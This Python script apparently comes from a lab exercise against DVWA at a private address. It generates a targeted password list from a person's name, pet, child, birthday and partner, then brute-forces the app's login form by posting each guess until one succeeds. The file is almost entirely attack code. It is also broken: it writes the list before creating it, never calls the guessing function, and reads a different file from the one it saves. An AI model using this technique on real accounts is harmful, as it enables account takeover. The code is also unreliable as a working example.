#!/usr/bin/env python3

import requests
import itertools
import random

target_url= "http://192.168.120.2/dvwa/login.php"
login_data = {"username": "admin", "password": "", "Login": "submit"}
def generate_passwords(params, max_passwords=1000):
    words = []

    # Extract values from input dictionary
    name = params.get("name", "")
    dog_name = params.get("dog_name", "")
    kid_name = params.get("kid_name", "")
    birth_year = str(params.get("birth_year", ""))
    birthday = str(params.get("birthday", ""))  # e.g., MMDD or DDMM
    significant_other = params.get("significant_other", "")

    base_words = [name, dog_name, kid_name, birth_year, birthday, significant_other]
    base_words = [word for word in base_words if word]

    # Generate basic combinations
    for word in base_words:
        words.append(word)
        words.append(word.lower())
        words.append(word.upper())
        words.append(word.capitalize())

    # Mix words together
    combinations = list(itertools.permutations(base_words, 2))
    for combo in combinations:
        words.append("".join(combo))
        words.append("".join(combo).lower())
        words.append("".join(combo).capitalize())
        words.append("".join(combo).upper())

    # Add common password patterns
    common_patterns = ["123", "!", "@", "#", "$", "%", "*"]
    for word in words[:]:
        for pattern in common_patterns:
            words.append(word + pattern)
            words.append(pattern + word)

    # Shuffle and limit passwords
    random.shuffle(words)
    words = list(set(words))  # Remove duplicates
    words = words[:max_passwords]

    return words


# Example usage:
params = {
    "name": "Walter",
    "dog_name": "Rex",
    "kid_name": "Emma",
    "birth_year": 1990,
    "birthday": "0415",
    "significant_other": "Lily"
}


# Save passwords to a file
with open("generated_passwords.txt", "w") as f:
    f.write("\n".join(passwords))

print(f"Generated {len(passwords)} passwords and saved to generated_passwords.txt")

def guess_password(url):
    with open("/root/PycharmProjects/web_hacking/possible_passwords.txt", "r") as passwords:
        for line in passwords:
            word = line.strip()
            login_data["password"] = word
            response = requests.post(target_url, data=login_data)
            if "Login failed" not in response.content.decode():
                print("[!] Login Succeeded with password: " + word)
                exit()

passwords = generate_passwords(params)
